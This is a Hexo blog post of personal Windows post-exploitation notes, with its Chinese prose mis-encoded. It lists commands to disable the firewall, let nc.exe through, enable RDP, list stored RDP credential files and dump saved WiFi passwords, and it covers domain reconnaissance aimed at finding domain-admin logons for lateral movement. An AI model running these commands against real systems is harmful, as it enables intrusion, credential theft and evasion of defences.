<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"æœç´¢å¸–å­","hits_empty":"æˆ‘ä»¬æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœ: ${query}","hits_stats":"åœ¨ ${time} æ¯«ç§’å†…æ‰¾åˆ° ${hits} ç»“æœ"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="æ€»ä¹‹ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
<meta property="og:type" content="article">
<meta property="og:title" content="test">
<meta property="og:url" content="http://example.com/2025/01/03/test/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="æ€»ä¹‹ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.imgur.com/hKYm43g.png">
<meta property="og:image" content="https://i.imgur.com/DI9YStV.png">
<meta property="og:image" content="https://i.imgur.com/yuG4KbE.png">
<meta property="og:image" content="https://i.imgur.com/dS847Ty.gif">
<meta property="og:image" content="https://i.imgur.com/nuqXfpn.png">
<meta property="og:image" content="https://i.imgur.com/HRWPYPn.png">
<meta property="og:image" content="https://i.imgur.com/4NMr876.png">
<meta property="og:image" content="https://i.imgur.com/8A2TJoz.png">
<meta property="og:image" content="https://i.imgur.com/B9FtUiz.png">
<meta property="og:image" content="https://i.imgur.com/wL2qzTd.png">
<meta property="og:image" content="https://i.imgur.com/GUdSRnQ.png">
<meta property="og:image" content="https://i.imgur.com/MmmDM5l.png">
<meta property="og:image" content="https://i.imgur.com/fYAAgEm.png">
<meta property="og:image" content="https://i.imgur.com/arYznKP.png">
<meta property="og:image" content="https://i.imgur.com/Z8zrS0T.png">
<meta property="og:image" content="https://i.imgur.com/HgdZwSf.png">
<meta property="og:image" content="https://i.imgur.com/2QQpneO.png">
<meta property="og:image" content="https://i.imgur.com/zsjJUbn.png">
<meta property="og:image" content="https://i.imgur.com/UqlwhNV.png">
<meta property="og:image" content="https://i.imgur.com/5paDsXN.png">
<meta property="og:image" content="https://i.imgur.com/OQfSBtx.png">
<meta property="og:image" content="https://i.imgur.com/DLeJLvQ.png">
<meta property="og:image" content="https://i.imgur.com/0VXCL0g.png">
<meta property="og:image" content="https://i.imgur.com/I8Ankov.png">
<meta property="og:image" content="https://i.imgur.com/OOtsn6J.png">
<meta property="og:image" content="https://i.imgur.com/vMBRWdY.png">
<meta property="og:image" content="https://i.imgur.com/fxAD4BT.png">
<meta property="og:image" content="https://i.imgur.com/8A4xmVl.png">
<meta property="og:image" content="https://i.imgur.com/skX6GcZ.png">
<meta property="og:image" content="https://i.imgur.com/ujDA0HP.png">
<meta property="og:image" content="https://i.imgur.com/ezYAnTB.png">
<meta property="og:image" content="https://i.imgur.com/Sgg8BQc.png">
<meta property="og:image" content="https://i.imgur.com/WtqXDYl.png">
<meta property="og:image" content="https://i.imgur.com/iPZ1EbK.png">
<meta property="og:image" content="https://i.imgur.com/lqcOQaW.png">
<meta property="og:image" content="https://i.imgur.com/P43vKKI.png">
<meta property="og:image" content="https://i.imgur.com/r2iH9O2.png">
<meta property="og:image" content="https://i.imgur.com/TqAaVQw.png">
<meta property="og:image" content="https://i.imgur.com/agv2eNC.png">
<meta property="og:image" content="https://i.imgur.com/G8MAg7N.png">
<meta property="og:image" content="https://i.imgur.com/jSsAnzD.png">
<meta property="og:image" content="https://i.imgur.com/ii27JG8.png">
<meta property="og:image" content="https://i.imgur.com/zh6Qw9P.png">
<meta property="og:image" content="https://i.imgur.com/ProY53j.png">
<meta property="og:image" content="https://i.imgur.com/wYhe535.png">
<meta property="og:image" content="https://i.imgur.com/cVffkuw.png">
<meta property="og:image" content="https://i.imgur.com/aOjJgmH.png">
<meta property="og:image" content="https://i.imgur.com/YlQjErK.png">
<meta property="og:image" content="https://i.imgur.com/rDJoOt6.png">
<meta property="og:image" content="https://i.imgur.com/peoiNeH.png">
<meta property="og:image" content="https://i.imgur.com/BJS0Huk.png">
<meta property="og:image" content="https://i.imgur.com/hynbYKc.png">
<meta property="og:image" content="https://i.imgur.com/KDXQ6IY.png">
<meta property="og:image" content="https://i.imgur.com/GSsXqbW.png">
<meta property="og:image" content="https://i.imgur.com/x3wNcTf.png">
<meta property="og:image" content="https://i.imgur.com/kRxn3tc.png">
<meta property="og:image" content="https://i.imgur.com/DF1HGcu.png">
<meta property="og:image" content="https://i.imgur.com/7IHwreX.png">
<meta property="og:image" content="https://i.imgur.com/AsePSeD.png">
<meta property="og:image" content="https://i.imgur.com/5ZFg60n.png">
<meta property="og:image" content="https://i.imgur.com/pqFpKy4.png">
<meta property="og:image" content="https://i.imgur.com/cGHlcGa.png">
<meta property="og:image" content="https://i.imgur.com/qPbxbvK.png">
<meta property="og:image" content="https://i.imgur.com/jq4MfPd.png">
<meta property="og:image" content="https://i.imgur.com/0qwDQVc.png">
<meta property="og:image" content="https://i.imgur.com/cMPZJKm.png">
<meta property="og:image" content="https://i.imgur.com/XsAxPu2.png">
<meta property="og:image" content="https://i.imgur.com/z0MrGwR.png">
<meta property="og:image" content="https://i.imgur.com/qleMPyM.png">
<meta property="og:image" content="https://i.imgur.com/uWBi7n3.png">
<meta property="og:image" content="https://i.imgur.com/yDXynMu.png">
<meta property="og:image" content="https://i.imgur.com/yIFnec2.png">
<meta property="og:image" content="https://i.imgur.com/mzvyOwG.png">
<meta property="og:image" content="https://i.imgur.com/wGOZOli.png">
<meta property="og:image" content="https://i.imgur.com/OwgaSmk.png">
<meta property="og:image" content="https://i.imgur.com/SjVV8TI.png">
<meta property="og:image" content="https://i.imgur.com/M3M1B57.png">
<meta property="og:image" content="https://i.imgur.com/zAyljql.png">
<meta property="og:image" content="https://i.imgur.com/IVOUGmC.png">
<meta property="og:image" content="https://i.imgur.com/4F98t7g.png">
<meta property="og:image" content="https://i.imgur.com/hucCXGT.png">
<meta property="og:image" content="https://i.imgur.com/nb8mHnk.png">
<meta property="og:image" content="https://i.imgur.com/stu6e54.png">
<meta property="og:image" content="https://i.imgur.com/mww7HKX.png">
<meta property="og:image" content="https://i.imgur.com/1Q7k4Ob.png">
<meta property="og:image" content="https://i.imgur.com/S5vE3dr.png">
<meta property="og:image" content="https://i.imgur.com/xbHE2An.png">
<meta property="og:image" content="https://i.imgur.com/r64yjaJ.png">
<meta property="og:image" content="https://i.imgur.com/1RexTCM.png">
<meta property="og:image" content="https://i.imgur.com/I5n52So.png">
<meta property="og:image" content="https://i.imgur.com/FzPPVJJ.gif">
<meta property="og:image" content="https://i.imgur.com/9RvGyWF.png">
<meta property="og:image" content="https://i.imgur.com/lqVR7B4.png">
<meta property="og:image" content="https://i.imgur.com/1XiNNAP.png">
<meta property="article:published_time" content="2025-01-02T16:00:00.000Z">
<meta property="article:modified_time" content="2025-01-04T07:25:33.722Z">
<meta property="article:author" content="kecçš„åšå®¢">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/hKYm43g.png">

<link rel="canonical" href="http://example.com/2025/01/03/test/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>test | Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/03/test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="kecçš„åšå®¢">
      <meta itemprop="description" content="ä¸€å¥è¯çš„é•¿åº¦">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          test
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-01-03 00:00:00" itemprop="dateCreated datePublished" datetime="2025-01-03T00:00:00+08:00">2025-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-01-04 15:25:33" itemprop="dateModified" datetime="2025-01-04T15:25:33+08:00">2025-01-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>æ€»ä¹‹ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<span id="more"></span>

<h2 id="æœ¬åœ°ä¿¡æ¯æ”¶é›†åŠåŸºç¡€æ“ä½œ"><a href="#æœ¬åœ°ä¿¡æ¯æ”¶é›†åŠåŸºç¡€æ“ä½œ" class="headerlink" title="æœ¬åœ°ä¿¡æ¯æ”¶é›†åŠåŸºç¡€æ“ä½œ"></a>æœ¬åœ°ä¿¡æ¯æ”¶é›†åŠåŸºç¡€æ“ä½œ</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">ipconfig:æ”¶é›†æœ¬æœº ip ä¿¡æ¯ï¼Œç‰¹åˆ«æ³¨æ„æœ‰åŒç½‘å¡çš„æƒ…å†µã€‚</span><br><span class="line"></span><br><span class="line">systeminfo:æ”¶é›†ä¸»æœºåã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œè¡¥ä¸ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PROCESSOR_ARCHITECTURE&quot;</span>:æŸ¥çœ‹ç³»ç»Ÿæ¶æ„</span><br><span class="line"></span><br><span class="line">wmic product get name,version </span><br><span class="line">poweshell <span class="string">&quot;GET-WmiObject -class win32_product|Select-Object-Property name,version&quot;</span>:æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">wmic service list brief:æŸ¥çœ‹ç”µè„‘è¿è¡Œçš„æœåŠ¡</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> list brief </span><br><span class="line">tasklist /svc:æŸ¥çœ‹ç”µè„‘è¿è¡Œçš„è¿›ç¨‹ï¼ˆæ³¨æ„å„ç±»æ€è½¯ã€EDR ç­‰å®‰å…¨è½¯ä»¶ æ˜¯å¦æœ‰æ•°æ®åº“ã€ä»£ç†ã€ç½‘ç»œç›‘æ§ zabix ç­‰ï¼‰</span><br><span class="line"></span><br><span class="line">wmic startup get command,caption:æŸ¥çœ‹ç”µè„‘å¯åŠ¨é¡¹</span><br><span class="line"></span><br><span class="line">schtasks /query /fo LIST /v:æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œå¦‚æœå‡ºç°æ— æ³•åŠ è½½åˆ—èµ„æºçš„é”™è¯¯ è¾“å…¥:chcp <span class="number">437</span></span><br><span class="line"></span><br><span class="line">net statistics workstation:æŸ¥çœ‹ç”µè„‘å¼€æœºæ—¶é—´</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line">net user:æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·</span><br><span class="line"></span><br><span class="line">net session:æŸ¥çœ‹ä¼šè¯æƒ…å†µ</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-ano</span>:æŸ¥è¯¢ç”µè„‘ç«¯å£å¼€æ”¾ä¿¡æ¯å’Œè¿æ¥æƒ…å†µï¼ˆå¯èƒ½ä¼šæ‰¾åˆ°å†…ç½‘å…¶ä»–æœåŠ¡å™¨ å¦‚æ•°æ®</span><br><span class="line"></span><br><span class="line">åº“æœåŠ¡å™¨ï¼‰</span><br><span class="line"></span><br><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antiviruspr</span><br><span class="line">oduct get displayname /format:list:æŸ¥è¯¢æ€è½¯</span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br><span class="line">net share:æŸ¥çœ‹å…±äº«ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">route print:æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">netsh firewall show state:æŸ¥çœ‹é˜²ç«å¢™ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable:å…³é—­é˜²ç«å¢™</span><br><span class="line"></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off:å…³é—­é˜²ç«å¢™ï¼ˆWS2003 ä¹‹åæ‰èƒ½ä½¿</span><br><span class="line"></span><br><span class="line">ç”¨è¯¥å‘½ä»¤ï¼‰</span><br><span class="line"></span><br><span class="line">cmdkey /l :æŸ¥çœ‹ RDP ç­‰å‡­æ®ä¿¡æ¯ï¼Œå¦‚æœå­˜åœ¨å¯ä»¥ç ´è§£æ‹¿åˆ°æ˜æ–‡å¯†ç </span><br><span class="line"></span><br><span class="line">arp <span class="literal">-a</span> :æŸ¥çœ‹ arp ä¿¡æ¯ å¯èƒ½ä¼šæ³„éœ²å†…ç½‘ç½‘æ®µå’Œ ip åœ°å€ç­‰ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> %APPDATA%\Microsoft\Windows\Recent :æŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">net localgroup :æŸ¥çœ‹æœ¬åœ°å·¥ä½œç»„</span><br><span class="line"></span><br><span class="line">net localgroup administrators ï¼šæŸ¥çœ‹ç»„æˆå‘˜ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">C:\Users\kzh\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine :powershell å†å²å‘½ä»¤</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é˜²ç«å¢™æ”¾è¡Œç‰¹å®šç¨‹åºæˆ–ç«¯å£ï¼Œç›´æ¥å…³é—­é˜²ç«å¢™åŠ¨é™å¤ªå¤§</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2003</span> åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šçš„ç¨‹åºè¿›è¡Œå…¨éƒ¨çš„è¿æ¥</span><br><span class="line"></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">&quot;allownc&quot;</span> enable</span><br><span class="line"></span><br><span class="line"><span class="number">2003</span> ä¹‹åçš„ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šçš„ç¨‹åºè¿›è¡Œå…¨éƒ¨çš„è¿æ¥</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span><span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">å…è®¸æŒ‡å®šç¨‹åºé€€å‡ºï¼Œå‘½ä»¤å¦‚ä¸‹netsh advfirewall firewall add rule name=<span class="string">&quot;Allownc&quot;</span><span class="built_in">dir</span>=out action=allowprogram=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">å…è®¸ <span class="number">3389</span> ç«¯å£æ”¾è¡Œï¼Œå‘½ä»¤å¦‚ä¸‹</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;RemoteDesktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¼€å¯è¿œç¨‹ 3389</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber æŸ¥çœ‹ RDP ç«¯å£(<span class="number">0</span>xd3d ä¸º <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f å¼€å¯</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f å…³é—­</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :æŸ¥çœ‹ RDP å‡­æ®ï¼ˆå¯ç ´è§£æ˜æ–‡è´¦å·å¯†ç ï¼‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>wifi ç›¸å…³:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹è¿æ¥è¿‡çš„ wifi åç§°</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"></span><br><span class="line">è·å– wifi åç§°ä¸º xxx çš„å¯†ç </span><br><span class="line">netsh wlan show profile name=<span class="string">&quot;xxx&quot;</span> key=<span class="built_in">clear</span></span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æ‰€æœ‰ wifi åŠå¯†ç </span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)<span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr <span class="literal">-i</span> <span class="literal">-v</span> <span class="built_in">echo</span> |netsh wlan show profiles %j key=<span class="built_in">clear</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">wmic useraccount</span><br></pre></td></tr></table></figure>
<p>whoami å¯èƒ½å‡ºç°çš„å‡ ç§æƒ…å†µ:</p>
<ul>
<li>æœ¬åœ°ç”¨æˆ·:æœºå™¨å</li>
<li>æœ¬åœ°è¶…ç®¡:æœºå™¨å</li>
<li>åŸŸç”¨æˆ·:åŸŸååŸŸè¶…ç®¡:åŸŸå<br>å¦‚æœå†…ç½‘ä¸­å­˜åœ¨åŸŸï¼Œåªæœ‰æœ¬åœ°è¶…ç®¡(åŒ…æ‹¬ system)å’ŒåŸŸå†…ç”¨æˆ·å¯ä»¥æŸ¥è¯¢åŸŸå†…ä¿¡æ¯</li>
</ul>
<p>åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨<br>ipconfig &#x2F;all<br>systeminfo<br>net config workstation<br>net time &#x2F;domain</p>
<p>æŸ¥è¯¢åŸŸå†…ç»„&#x2F;ç»„æˆå‘˜<br>net group &#x2F;domain<br>net gtoup â€œDomain Adminsâ€ &#x2F;domain</p>
<p>æŸ¥è¯¢åŸŸå†…å­˜æ´»è®¡ç®—æœº<br>net view &#x2F;domain:åŸŸå</p>
<p>æŸ¥è¯¢åŸŸå†…å¯†ç æµ‹ç­–ç•¥<br>net accounts &#x2F;domai</p>
<p>å®šä½åŸŸæ§(ğŸ‘)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:åŸŸå</span><br><span class="line"></span><br><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">nslookup åŸŸå</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain:æŸ¥çœ‹åŸŸæ§ç»„ä¸­çš„æœºå™¨</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> %LOGONSERVER%.%USERDNSDOMAIN%</span><br></pre></td></tr></table></figure>


<p>è·å–åŸŸå†…ç”¨æˆ·å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;ç»„å&quot; /domain</span><br></pre></td></tr></table></figure>

<p>å®šä½åŸŸç®¡ç†å‘˜</p>
<p>åŸå› ï¼šæ–¹ä¾¿åç»­æ¨ªå‘ç§»åŠ¨å‡è®¾å½“å‰æ§åˆ¶äº†ä¸€å°åŸŸå†…ä¸»æœºï¼Œä½†æ˜¯è¯¥ä¸»æœºä¸ŠåŸŸç®¡ç”¨æˆ·å‹æ ¹æ²¡æœ‰ç™»å½•è¿‡ã€‚æ‰€ä»¥æˆ‘ä»¬å¦‚æœèƒ½æ‰¾åˆ°åŸŸç®¡ç†å‘˜åœ¨å“ªå°ç”µè„‘ä¸Šç™»å½•è¿‡ï¼Œè¯¥ç”µè„‘å°±æ˜¯é¦–è¦æ”»å‡»ç›®æ ‡ï¼Œç»“åˆå¯†ç æŠ“å–æŠ€æœ¯ï¼Œå¯ä»¥è½»æ˜“è·å–åŸŸç®¡å‡­æ®ã€‚</p>
<p>PsLoggedon</p>
<p>è¯¥å·¥å…·å¯ä»¥æ˜¾ç¤ºæœ¬åœ°ç™»å½•çš„ç”¨æˆ·å’Œé€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºçš„èµ„æºç™»å½•çš„ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šäº†ç”¨æˆ·åè€Œä¸æ˜¯è®¡ç®—æœºï¼Œpsloggedon.exe ä¼šæœç´¢ç½‘ç»œé‚»å±…ä¸­çš„è®¡ç®—æœºï¼Œå¹¶æ˜¾ç¤ºè¯¥ç”¨æˆ·å½“å‰æ˜¯å¦å·²ç™»å½•ã€‚</p>
<p>å¾®è½¯è‡ªå¸¦å·¥å…·ï¼Œæ€è½¯å‹å¥½</p>
<p>é¦–æ¬¡ä½¿ç”¨éœ€è¦è¾“å…¥ <code>psloggedon.exe -accepteula</code> åŒæ„ç”¨æˆ·åè®®</p>
<p><code>psloggedon.exe \\computername or \\username</code></p>
<p>PVEFindADUser</p>
<p>pveFindADUser.exe å¯ç”¨äºæŸ¥æ‰¾ AD ç”¨æˆ·ç™»å½•çš„ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹</p>
<p>å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡ RDP ç™»å½•çš„ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å’Œ</p>
<p>è®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·è´¦æˆ·ã€‚</p>
<p>pveFindADUser.exe -current æŸ¥çœ‹æœºå™¨ä¸­å½“å‰ç™»å½•çš„ç”¨æˆ·</p>
<p>-current â€œç”¨æˆ·åâ€ æ˜¾ç¤ºè¯¥ç‰¹å®šç”¨æˆ·ç™»å½•çš„è®¡ç®—æœº</p>
<p>-last æŸ¥çœ‹æ¯å°æœºå™¨æœ€åç™»å½•çš„ç”¨æˆ·</p>
